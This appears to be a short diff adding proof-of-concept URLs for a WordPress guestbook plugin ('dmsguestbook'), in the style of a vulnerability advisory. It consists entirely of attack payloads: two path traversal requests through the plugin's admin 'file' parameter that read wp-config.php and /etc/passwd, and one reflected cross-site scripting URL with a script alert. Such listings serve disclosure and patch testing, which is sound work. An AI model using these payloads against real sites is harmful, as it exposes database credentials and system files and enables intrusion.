@@ -1,0 +1,6 @@
+Information-disclosure examples:
+http://www.example.com/wordpress/wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=../../../../wp-config.php
+http://www.example.com/wordpress/wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=../../../../../../../../../../../../../../../../etc/passwd
+
+cross-site scripting example:
+http://www.example.com/wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
